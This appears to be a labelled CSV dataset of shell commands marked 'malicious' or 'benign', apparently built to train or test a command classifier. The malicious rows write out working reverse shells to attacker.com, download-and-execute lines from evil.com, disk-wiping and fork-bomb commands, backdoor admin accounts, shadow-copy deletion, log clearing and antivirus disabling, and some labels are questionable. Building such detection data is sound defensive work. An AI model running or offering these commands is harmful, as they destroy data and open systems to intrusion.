command,label
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
useradd newuser -v,benign
shutdown /r /f /t 0,malicious
mkfs.ext4 /dev/sda1,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
last,benign
cat /dev/urandom > /dev/sda,malicious
du -sh /var/log,benign
wc -l document.txt,benign
rmdir empty_folder,benign
nohup nc -l -p 4444 -e /bin/bash,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
timeout 60 cat /dev/urandom > /dev/sda,malicious
wevtutil cl System,malicious
mkdir -p /tmp/test,benign
sdelete -p 10 -s -z C:\,malicious
timeout 60 powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
mkfs.ext4 /dev/sda1,malicious
git pull origin main,benign
taskkill /f /im antimalware.exe,malicious
last,benign
(wmic process call create 'cmd.exe /c powershell.exe'),malicious
rm -rf /,malicious
net user hacker password123 /add,malicious
systemctl status nginx,benign
sc stop Windows Defender >/dev/null,malicious
du -sh /var/log,benign
timeout 60 wevtutil cl Security,malicious
rm -rf /,malicious
sudo tail -f /var/log/syslog,benign
passwd user,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
cp file1.txt file2.txt,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe &,malicious
sudo node --version,benign
lsblk,benign
uptime,benign
dd if=/dev/zero of=/dev/sda,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' 2>&1",malicious
nohup :(){ :|:& };:,malicious
which python,benign
sudo cat /etc/passwd,benign
useradd newuser,benign
docker images | head -5,benign
ls -la,benign
type ls,benign
ufw status,benign
python -m http.server 8080,malicious
uptime,benign
man ls,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
sc stop Windows Defender,malicious
yum list installed,benign
"cut -d',' -f1 data.csv",benign
(vssadmin delete shadows /all /quiet),malicious
touch newfile.txt,benign
yum list installed > output.txt,benign
diskpart select disk 0 clean,malicious
cat /dev/urandom > /dev/sda,malicious
sudo du -sh /var/log,benign
iostat > output.txt,benign
ls -la,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
cat /dev/urandom > /dev/sda,malicious
chmod 777 /etc/shadow,malicious
top,benign
yum list installed,benign
vssadmin delete shadows /all /quiet,malicious
chown user:group file.txt,benign
nslookup google.com,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
du -sh /var/log,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
sudo w,benign
systemctl reload nginx,benign
mount --help,benign
scp file.txt user@server:/path/,benign
"(rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS'))",malicious
nohup taskkill /f /im antimalware.exe,malicious
docker ps > output.txt,benign
mkfs.ext4 /dev/sda1 2>&1,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
mv old.txt new.txt 2>/dev/null,benign
vssadmin delete shadows /all /quiet &,malicious
nc -l -p 4444 -e /bin/bash,malicious
vssadmin delete shadows /all /quiet,malicious
service apache2 status,benign
wevtutil cl System 2>&1,malicious
taskkill /f /im antimalware.exe 2>&1,malicious
net localgroup administrators hacker /add,malicious
rsync -av /src/ /dst/,benign
nslookup google.com,benign
systemctl reload nginx,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
ping -c 4 google.com,benign
passwd user | head -5,benign
echo 'virus' > /etc/passwd,malicious
nc -l -p 4444 -e /bin/bash,malicious
"timeout 60 python -c 'import os; os.system(""rm -rf /"")'",malicious
java -version,benign
net localgroup administrators hacker /add,malicious
netstat -tulpn -v,benign
chown user:group file.txt --help,benign
systemctl status nginx,benign
systemctl status nginx,benign
pwd,benign
sdelete -p 10 -s -z C:\,malicious
net localgroup administrators hacker /add,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
:(){ :|:& };: >/dev/null,malicious
chmod 755 script.sh,benign
man ls > output.txt,benign
(vssadmin delete shadows /all /quiet),malicious
net localgroup administrators hacker /add 2>&1,malicious
wevtutil cl Security,malicious
mkdir -p /tmp/test,benign
cat /etc/passwd,benign
curl http://evil.com/payload.sh | bash,malicious
diskpart select disk 0 clean,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' &",malicious
rmdir empty_folder,benign
df -h,benign
python -m http.server 8080 >/dev/null,malicious
traceroute google.com,benign
head -10 logfile.txt,benign
userdel olduser,benign
history,benign
ufw status > output.txt,benign
sc stop Windows Defender,malicious
vssadmin delete shadows /all /quiet >/dev/null,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
wevtutil cl System,malicious
mshta javascript:alert('code execution'),malicious
nslookup google.com > output.txt,benign
timeout 60 regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
wmic process call create 'cmd.exe /c powershell.exe' >/dev/null,malicious
type ls,benign
rsync -av /src/ /dst/,benign
service apache2 status,benign
rm -rf /,malicious
python -m http.server 8080,malicious
dd if=/dev/zero of=/dev/sda,malicious
sc stop Windows Defender,malicious
whoami,benign
id user,benign
touch newfile.txt -v,benign
htop,benign
sudo htop,benign
curl -I https://google.com,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
nslookup google.com,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
vssadmin delete shadows /all /quiet,malicious
echo 'virus' > /etc/passwd &,malicious
top 2>/dev/null,benign
mount,benign
(schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon),malicious
wget http://malicious.com/malware.exe &,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
cmd /c del /q /s C:\*,malicious
node --version,benign
chmod 755 script.sh,benign
sed 's/old/new/g' file.txt 2>/dev/null,benign
"nohup awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
wget https://example.com/file.txt,benign
wget http://malicious.com/malware.exe,malicious
ss -tulpn,benign
rsync -av /src/ /dst/,benign
grep pattern file.txt | head -5,benign
vssadmin delete shadows /all /quiet,malicious
net localgroup administrators hacker /add,malicious
vmstat,benign
usermod -aG sudo user,benign
curl -I https://google.com > output.txt,benign
net user hacker password123 /add,malicious
touch newfile.txt,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
apt list --installed,benign
timeout 60 shutdown /r /f /t 0,malicious
head -10 logfile.txt,benign
userdel olduser,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= >/dev/null,malicious
pip list,benign
systemctl reload nginx,benign
usermod -aG sudo user,benign
taskkill /f /im antimalware.exe,malicious
wget http://malicious.com/malware.exe,malicious
nohup ncat -lvp 443 -e cmd.exe,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
ls -la,benign
nohup chmod 777 /etc/shadow,malicious
docker images,benign
rm -rf /,malicious
passwd user -v,benign
curl -I https://google.com,benign
"timeout 60 python -c 'import os; os.system(""rm -rf /"")'",malicious
python -m http.server 8080,malicious
wevtutil cl Security >/dev/null,malicious
whoami | head -5,benign
taskkill /f /im antimalware.exe,malicious
ssh user@server.com | head -5,benign
traceroute google.com,benign
dd if=/dev/zero of=/dev/sda,malicious
sudo iptables -L,benign
sudo finger user,benign
net user hacker password123 /add,malicious
id user,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
sdelete -p 10 -s -z C:\ >/dev/null,malicious
yum list installed --help,benign
"timeout 60 perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
rm -rf /,malicious
nc -l -p 4444 -e /bin/bash,malicious
ssh user@server.com,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
mount,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
node --version 2>/dev/null,benign
mshta javascript:alert('code execution'),malicious
mkdir -p /tmp/test,benign
vmstat,benign
"nohup socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
type ls,benign
cat /dev/urandom > /dev/sda &,malicious
apt list --installed,benign
tail -f /var/log/syslog,benign
w | head -5,benign
top,benign
sudo which python,benign
curl http://evil.com/payload.sh | bash,malicious
fdisk -l,benign
net user hacker password123 /add,malicious
sc stop Windows Defender,malicious
timeout 60 dd if=/dev/zero of=/dev/sda,malicious
systemctl reload nginx,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
net localgroup administrators hacker /add >/dev/null,malicious
crontab -l,benign
wevtutil cl System,malicious
free -m,benign
echo 'virus' > /etc/passwd,malicious
mv old.txt new.txt | head -5,benign
nohup reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
service apache2 status,benign
git pull origin main,benign
sudo awk '{print $1}' data.txt,benign
sudo umount /dev/sdb1,benign
grep pattern file.txt,benign
echo 'virus' > /etc/passwd 2>&1,malicious
iptables -L,benign
netstat -tulpn,benign
nc -l -p 4444 -e /bin/bash,malicious
cipher /w:C:\,malicious
mshta javascript:alert('code execution'),malicious
cat /dev/urandom > /dev/sda >/dev/null,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
top,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
rmdir empty_folder,benign
shutdown /r /f /t 0,malicious
"nohup awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
nslookup google.com --help,benign
crontab -l,benign
nc -l -p 4444 -e /bin/bash,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
cmd /c del /q /s C:\*,malicious
git clone https://github.com/user/repo.git,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
scp file.txt user@server:/path/ | head -5,benign
grep pattern file.txt,benign
mount,benign
sort data.txt,benign
apt list --installed,benign
tar -czf backup.tar.gz /data,benign
tar -czf backup.tar.gz /data,benign
lsblk --help,benign
iostat,benign
type ls,benign
type ls,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
npm list,benign
net localgroup administrators hacker /add,malicious
mkfs.ext4 /dev/sda1,malicious
cipher /w:C:\,malicious
(copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\),malicious
(dd if=/dev/zero of=/dev/sda),malicious
nslookup google.com,benign
curl -I https://google.com,benign
timeout 60 rm -rf /,malicious
sudo mv old.txt new.txt,benign
nslookup google.com,benign
netsh advfirewall set allprofiles state off,malicious
ps aux,benign
(netsh advfirewall set allprofiles state off),malicious
timeout 60 certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
w,benign
nc -l -p 4444 -e /bin/bash 2>&1,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
finger user -v,benign
nc -l -p 4444 -e /bin/bash 2>&1,malicious
wget https://example.com/file.txt,benign
ping -c 4 google.com,benign
traceroute google.com,benign
awk '{print $1}' data.txt,benign
uniq sorted.txt,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
format C: /q /x,malicious
vssadmin delete shadows /all /quiet,malicious
sc stop Windows Defender,malicious
:(){ :|:& };: &,malicious
timeout 60 bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
mshta javascript:alert('code execution') >/dev/null,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
format C: /q /x,malicious
tail -f /var/log/syslog,benign
id user 2>/dev/null,benign
scp file.txt user@server:/path/,benign
sudo which python,benign
sdelete -p 10 -s -z C:\,malicious
wget http://malicious.com/malware.exe,malicious
mount,benign
net user hacker password123 /add,malicious
traceroute google.com,benign
who,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
rmdir empty_folder,benign
python --version,benign
usermod -aG sudo user,benign
wget https://example.com/file.txt,benign
passwd user --help,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
node --version,benign
systemctl reload nginx,benign
usermod -aG sudo user,benign
mkfs.ext4 /dev/sda1,malicious
rm -rf / >/dev/null,malicious
taskkill /f /im antimalware.exe,malicious
tail -f /var/log/syslog,benign
python --version | head -5,benign
cp file1.txt file2.txt,benign
fdisk -l,benign
tail -f /var/log/syslog | head -5,benign
net localgroup administrators hacker /add &,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe 2>&1,malicious
docker images,benign
nslookup google.com,benign
python --version,benign
java -version,benign
node --version,benign
net localgroup administrators hacker /add &,malicious
"(socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash)",malicious
"python -c 'import os; os.system(""rm -rf /"")' &",malicious
mshta javascript:alert('code execution'),malicious
nc -l -p 4444 -e /bin/bash,malicious
npm list,benign
htop -v,benign
echo 'virus' > /etc/passwd,malicious
ping -c 4 google.com,benign
iptables -L,benign
"python -c 'import os; os.system(""rm -rf /"")' 2>&1",malicious
sudo chown user:group file.txt,benign
ps aux,benign
wevtutil cl Security,malicious
who,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= >/dev/null,malicious
usermod -aG sudo user,benign
timeout 60 :(){ :|:& };:,malicious
sdelete -p 10 -s -z C:\ &,malicious
kubectl get pods,benign
vssadmin delete shadows /all /quiet,malicious
chmod 755 script.sh,benign
format C: /q /x,malicious
net user hacker password123 /add,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
history,benign
netstat -tulpn,benign
type ls 2>/dev/null,benign
apt list --installed,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
sudo history,benign
sudo touch newfile.txt,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
dd if=/dev/zero of=/dev/sda,malicious
taskkill /f /im antimalware.exe >/dev/null,malicious
last,benign
finger user,benign
curl http://evil.com/payload.sh | bash,malicious
cat /dev/urandom > /dev/sda 2>&1,malicious
attrib +h +s malware.exe,malicious
grep pattern file.txt,benign
python --version,benign
timeout 60 curl http://evil.com/payload.sh | bash,malicious
vssadmin delete shadows /all /quiet 2>&1,malicious
net localgroup administrators hacker /add,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
cmd /c del /q /s C:\*,malicious
umount /dev/sdb1 -v,benign
rmdir empty_folder,benign
rm -rf /,malicious
iptables -L,benign
mv old.txt new.txt,benign
pip list,benign
date,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
rm -rf /,malicious
ufw status,benign
systemctl status nginx,benign
nohup attrib +h +s malware.exe,malicious
nslookup google.com,benign
mshta javascript:alert('code execution') >/dev/null,malicious
git clone https://github.com/user/repo.git,benign
vssadmin delete shadows /all /quiet &,malicious
du -sh /var/log,benign
nc -l -p 4444 -e /bin/bash,malicious
useradd newuser,benign
man ls,benign
chown user:group file.txt | head -5,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
diskpart select disk 0 clean,malicious
wget http://malicious.com/malware.exe,malicious
mkfs.ext4 /dev/sda1,malicious
timeout 60 regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
dd if=/dev/zero of=/dev/sda,malicious
echo 'virus' > /etc/passwd,malicious
curl -I https://google.com,benign
curl http://evil.com/payload.sh | bash,malicious
iostat -v,benign
lsblk --help,benign
:(){ :|:& };:,malicious
rm -rf /,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
grep pattern file.txt,benign
scp file.txt user@server:/path/,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures >/dev/null,malicious
apt list --installed,benign
cat /dev/urandom > /dev/sda,malicious
tar -czf backup.tar.gz /data,benign
sdelete -p 10 -s -z C:\,malicious
w,benign
wmic process call create 'cmd.exe /c powershell.exe' >/dev/null,malicious
rm -rf /,malicious
(wevtutil cl System),malicious
vssadmin delete shadows /all /quiet,malicious
sudo apt list --installed,benign
umount /dev/sdb1,benign
chmod 777 /etc/shadow,malicious
service apache2 status,benign
kubectl get pods,benign
shutdown /r /f /t 0,malicious
iptables -L,benign
cp file1.txt file2.txt,benign
chmod 755 script.sh,benign
sudo rmdir empty_folder,benign
ncat -lvp 443 -e cmd.exe,malicious
docker images,benign
traceroute google.com,benign
tar -czf backup.tar.gz /data,benign
find /home -name '*.txt' -v,benign
format C: /q /x,malicious
netstat -tulpn,benign
groups user,benign
chmod 755 script.sh,benign
nc -l -p 4444 -e /bin/bash,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
net localgroup administrators hacker /add &,malicious
sudo systemctl reload nginx,benign
tar -czf backup.tar.gz /data,benign
iptables -L > output.txt,benign
dd if=/dev/zero of=/dev/sda >/dev/null,malicious
format C: /q /x,malicious
taskkill /f /im antimalware.exe,malicious
diskpart select disk 0 clean,malicious
:(){ :|:& };:,malicious
ss -tulpn | head -5,benign
:(){ :|:& };:,malicious
wc -l document.txt,benign
ncat -lvp 443 -e cmd.exe,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts &,malicious
du -sh /var/log,benign
npm list | head -5,benign
nc -l -p 4444 -e /bin/bash,malicious
systemctl status nginx > output.txt,benign
docker ps,benign
curl http://evil.com/payload.sh | bash >/dev/null,malicious
cp file1.txt file2.txt 2>/dev/null,benign
vssadmin delete shadows /all /quiet,malicious
wevtutil cl System,malicious
useradd newuser,benign
lsblk,benign
uptime 2>/dev/null,benign
du -sh /var/log > output.txt,benign
netstat -tulpn,benign
curl http://evil.com/payload.sh | bash,malicious
awk '{print $1}' data.txt | head -5,benign
history,benign
fdisk -l > output.txt,benign
who,benign
sdelete -p 10 -s -z C:\ &,malicious
echo 'Hello World',benign
"cut -d',' -f1 data.csv",benign
cipher /w:C:\,malicious
curl http://evil.com/payload.sh | bash,malicious
"(awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null)",malicious
cipher /w:C:\,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
nc -l -p 4444 -e /bin/bash &,malicious
traceroute google.com --help,benign
mkdir -p /tmp/test,benign
mkdir -p /tmp/test,benign
du -sh /var/log -v,benign
cipher /w:C:\,malicious
cmd /c del /q /s C:\*,malicious
rm -rf /,malicious
cat /dev/urandom > /dev/sda,malicious
iostat,benign
ssh user@server.com,benign
apt list --installed,benign
cipher /w:C:\,malicious
htop,benign
ps aux --help,benign
java -version,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ >/dev/null,malicious
find /home -name '*.txt' 2>/dev/null,benign
rmdir empty_folder,benign
grep pattern file.txt,benign
grep pattern file.txt,benign
scp file.txt user@server:/path/,benign
pwd | head -5,benign
du -sh /var/log | head -5,benign
(shutdown /r /f /t 0),malicious
lsblk --help,benign
wget http://malicious.com/malware.exe 2>&1,malicious
:(){ :|:& };:,malicious
vssadmin delete shadows /all /quiet,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
wget https://example.com/file.txt -v,benign
chmod 755 script.sh,benign
docker images --help,benign
wevtutil cl Security,malicious
ls -la,benign
whoami,benign
mv old.txt new.txt,benign
vssadmin delete shadows /all /quiet,malicious
du -sh /var/log,benign
npm list,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
timeout 60 cipher /w:C:\,malicious
ls -la,benign
shutdown /r /f /t 0,malicious
vssadmin delete shadows /all /quiet,malicious
last,benign
git pull origin main -v,benign
echo 'Hello World',benign
curl http://evil.com/payload.sh | bash,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
wevtutil cl System &,malicious
shutdown /r /f /t 0,malicious
who,benign
wget http://malicious.com/malware.exe,malicious
(net localgroup administrators hacker /add),malicious
vssadmin delete shadows /all /quiet,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
ncat -lvp 443 -e cmd.exe,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
diskpart select disk 0 clean,malicious
wget http://malicious.com/malware.exe 2>&1,malicious
vmstat,benign
attrib +h +s malware.exe 2>&1,malicious
man ls -v,benign
chmod 755 script.sh 2>/dev/null,benign
passwd user,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
ping -c 4 google.com -v,benign
attrib +h +s malware.exe,malicious
shutdown /r /f /t 0,malicious
mkfs.ext4 /dev/sda1,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
passwd user,benign
chmod 755 script.sh,benign
sudo pwd,benign
head -10 logfile.txt,benign
attrib +h +s malware.exe,malicious
mkfs.ext4 /dev/sda1,malicious
(certutil -urlcache -split -f http://evil.com/malware.exe malware.exe),malicious
which python | head -5,benign
:(){ :|:& };:,malicious
:(){ :|:& };:,malicious
pwd,benign
npm list,benign
netstat -tulpn 2>/dev/null,benign
mkdir -p /tmp/test,benign
sudo awk '{print $1}' data.txt,benign
mount,benign
sdelete -p 10 -s -z C:\,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
taskkill /f /im antimalware.exe,malicious
diskpart select disk 0 clean,malicious
ncat -lvp 443 -e cmd.exe,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
vmstat,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
attrib +h +s malware.exe 2>&1,malicious
lsblk,benign
cmd /c del /q /s C:\*,malicious
service apache2 status,benign
cmd /c del /q /s C:\*,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
java -version,benign
wevtutil cl Security,malicious
top,benign
